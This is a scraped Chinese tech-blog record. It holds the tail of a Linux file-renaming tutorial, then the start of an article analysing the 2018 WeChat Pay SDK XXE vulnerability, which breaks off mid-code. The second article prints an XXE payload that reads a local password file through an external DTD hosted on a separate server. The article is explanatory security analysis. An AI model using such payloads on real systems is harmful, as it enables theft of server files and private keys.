</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">tmp</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a4795109245014251-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">mv </span><span class=\"crayon-e\">myfile </span><span class=\"crayon-i\">notmyfile</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a4795109245014251-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">mv </span><span class=\"crayon-v\">myfile</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tmp</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">notmyfile</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a4795109245014251-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>但我们也有 <code>rename</code> 命令来做重命名。使用 <code>rename</code> 命令的窍门是习惯它的语法，但是如果你了解一些 Perl，你可能发现它并不棘手。</p>\n<p>有个非常有用的例子。假设你想重新命名一个目录中的文件，将所有的大写字母替换为小写字母。一般来说，你在 Unix 或 Linux 系统上找不到大量大写字母的文件，但你可以有。这里有一个简单的方法来重命名它们，而不必为它们中的每一个使用 <code>mv</code> 命令。 <code>/A-Z/a-z/</code> 告诉 <code>rename</code> 命令将范围 <code>A-Z</code> 中的任何字母更改为 <code>a-z</code> 中的相应字母。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a479510f750317178\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ls\r\nAgenda Group.JPG MyFile\r\n$ rename 'y/A-Z/a-z/' *\r\n$ ls\r\nagenda group.jpg myfile\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a479510f750317178-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a479510f750317178-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a479510f750317178-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a479510f750317178-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a479510f750317178-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a479510f750317178-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a479510f750317178-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ls</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a479510f750317178-2\"><span class=\"crayon-e\">Agenda </span><span class=\"crayon-v\">Group</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">JPG </span><span class=\"crayon-i\">MyFile</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a479510f750317178-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">rename</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'y/A-Z/a-z/'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a479510f750317178-4\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ls</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a479510f750317178-5\"><span class=\"crayon-e\">agenda </span><span class=\"crayon-v\">group</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">jpg </span><span class=\"crayon-i\">myfile</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a479510f750317178-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>你也可以使用 <code>rename</code> 来删除文件扩展名。也许你厌倦了看到带有 .txt 扩展名的文本文件。简单删除这些扩展名 —— 用一个命令。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a4795113833918699\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ls\r\nagenda.txt notes.txt weekly.txt\r\n$ rename 's/.txt//' *\r\n$ ls\r\nagenda notes weekly\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a4795113833918699-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a4795113833918699-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a4795113833918699-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a4795113833918699-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a4795113833918699-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a4795113833918699-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a4795113833918699-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ls</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a4795113833918699-2\"><span class=\"crayon-v\">agenda</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt </span><span class=\"crayon-v\">notes</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt </span><span class=\"crayon-v\">weekly</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a4795113833918699-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">rename</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'s/.txt//'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a4795113833918699-4\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ls</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a4795113833918699-5\"><span class=\"crayon-e\">agenda </span><span class=\"crayon-e\">notes </span><span class=\"crayon-i\">weekly</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a4795113833918699-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>现在让我们想象一下，你改变了心意，并希望把这些扩展名改回来。没问题。只需修改命令。窍门是理解第一个斜杠前的 <code>s</code> 意味着“替代”。前两个斜线之间的内容是我们想要改变的东西，第二个斜线和第三个斜线之间是改变后的东西。所以，<code>$</code> 表示文件名的结尾，我们将它改为 <code>.txt</code>。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a4795118352463489\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ls\r\nagenda notes weekly\r\n$ rename 's/$/.txt/' *\r\n$ ls\r\nagenda.txt notes.txt weekly.txt\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a4795118352463489-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a4795118352463489-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a4795118352463489-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a4795118352463489-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a4795118352463489-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a4795118352463489-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a4795118352463489-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ls</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a4795118352463489-2\"><span class=\"crayon-e\">agenda </span><span class=\"crayon-e\">notes </span><span class=\"crayon-i\">weekly</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a4795118352463489-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">rename</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'s/$/.txt/'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a4795118352463489-4\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ls</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a4795118352463489-5\"><span class=\"crayon-v\">agenda</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt </span><span class=\"crayon-v\">notes</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt </span><span class=\"crayon-v\">weekly</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a4795118352463489-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>你也可以更改文件名的其他部分。牢记 <code>s/旧内容/新内容/</code> 规则。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a479511d252459998\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ls\r\ndraft-minutes-2018-03 draft-minutes-2018-04 draft-minutes-2018-05\r\n$ rename 's/draft/approved/' *minutes*\r\n$ ls\r\napproved-minutes-2018-03 approved-minutes-2018-04 approved-minutes-2018-05\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a479511d252459998-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a479511d252459998-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a479511d252459998-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a479511d252459998-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a479511d252459998-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a479511d252459998-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a479511d252459998-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ls</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a479511d252459998-2\"><span class=\"crayon-v\">draft</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">minutes</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">03</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">draft</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">minutes</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">04</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">draft</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">minutes</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">05</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a479511d252459998-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">rename</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'s/draft/approved/'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-e \">minutes*</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a479511d252459998-4\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ls</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a479511d252459998-5\"><span class=\"crayon-v\">approved</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">minutes</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">03</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">approved</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">minutes</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">04</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">approved</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">minutes</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">05</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a479511d252459998-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>在上面的例子中注意到，当我们在 <code>s/old/new/</code> 中使用 <code>s</code> 时，我们用另一个名称替换名称的一部分。当我们使用 <code>y</code> 时，我们就是直译（将字符从一个范围替换为另一个范围）。</p>\n<h3 id=\"toc_2\">总结</h3>\n<p>现在有很多复制和重命名文件的方法。我希望其中的一些会让你在使用命令行时更愉快。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114148\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114148votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114148\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>"], "tags": "IT技术,Linux", "author": "Sandra Henry-stocker", "front_image_path": "full/d1b17b98748a74826464a08e6d30a4ee1b15b171.jpg"}
{"title": "谈谈微信支付曝出的漏洞", "createdate": "2018/07/06", "url": "http://blog.jobbole.com/114197/", "url_object_id": "f2c4471ed0ef1f9a2f5eb6a1621f2f3b", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/09/3fb6592ac92133a71f0ae78e43683e83.jpg"], "thumbs": 1, "bookmark": 1, "comments": null, "contents": ["<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/kismetv/p/9266224.html\">编程迷思</a>   </div><h1>一、背景</h1>\n<p>昨天（2018-07-04）微信支付的SDK曝出重大漏洞（XXE漏洞），通过该漏洞，攻击者可以获取服务器中目录结构、文件内容，如代码、各种私钥等。获取这些信息以后，攻击者便可以为所欲为，其中就包括众多媒体所宣传的“0元也能买买买”。</p>\n<p>漏洞报告地址；http://seclists.org/fulldisclosure/2018/Jul/3</p>\n<h1>二、漏洞原理</h1>\n<h2>1.  XXE漏洞</h2>\n<p>此次曝出的漏洞属于XXE漏洞，即XML外部实体注入（XML External Entity Injection）。</p>\n<p>XML文档除了可以包含声明和元素以外，还可以包含文档类型定义（即DTD）；如下图所示。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/fd852c808e1da4c7f569a8ac7e846bb6.png\" alt=\"\"></p>\n<p>在DTD中，可以引进实体，在解析XML时，实体将会被替换成相应的引用内容。该实体可以由外部引入(支持http、ftp等协议，后文以http为例说明)，如果通过该外部实体进行攻击，就是XXE攻击。</p>\n<p>可以说，<strong>XXE漏洞之所以能够存在，本质上在于在解析XML的时候，可以与外部进行通信；当XML文档可以由攻击者任意构造时，攻击便成为可能。</strong>在利用XXE漏洞可以做的事情当中，最常见最容易实现的，便是读取服务器的信息，包括目录结构、文件内容等；本次微信支付爆出的漏洞便属于这一种。</p>\n<h2>2.  微信支付漏洞</h2>\n<p>本次漏洞影响的范围是：在微信支付异步回调接口中，使用微信支付SDK进行XML解析的应用。注意这里的SDK是服务器端的SDK，APP端使用SDK并不受影响。</p>\n<p>SDK下载地址如下（目前微信官方宣传漏洞已修复）：https://pay.weixin.qq.com/wiki/doc/api/download/WxPayAPI_JAVA_v3.zip</p>\n<p>SDK中导致漏洞的代码是WXPayUtil工具类中的xmlToMap()方法：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/6d8373c58efb34c2810ec33cacbf601c.png\" alt=\"\"></p>\n<p>如上图所示，由于在解析XML时没有对外部实体的访问做任何限制，如果攻击者恶意构造xml请求，便可以对服务器进行攻击。下面通过实例介绍攻击的方法。</p>\n<h2>3.  攻击复现</h2>\n<p>下面在本机环境下进行复现。</p>\n<p>假设本地的web服务器127.0.0.1:8080中存在POST接口：/wxpay/callback，该接口中接收xml字符串做参数，并调用前述的WXPayUtil.xmlToMap(strXml)对xml参数进行解析。此外，/etc/password中存储了重要的密码数据（如password1234）。</p>\n<p>攻击时构造的请求如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/9606ad59ae08f52ccf9b7d1fe44b6c09.png\" alt=\"\"></p>\n<p>其中xml内容如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d89781d02d181565726\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\r\n&lt;!DOCTYPE root [\r\n    &lt;!ENTITY % file SYSTEM \"file:///etc/password\"&gt;\r\n    &lt;!ENTITY % xxe SYSTEM \"http://127.0.0.1:9000/xxe.dtd\"&gt;\r\n    %xxe;\r\n]&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d89781d02d181565726-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d89781d02d181565726-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d89781d02d181565726-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d89781d02d181565726-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4d89781d02d181565726-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d89781d02d181565726-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div 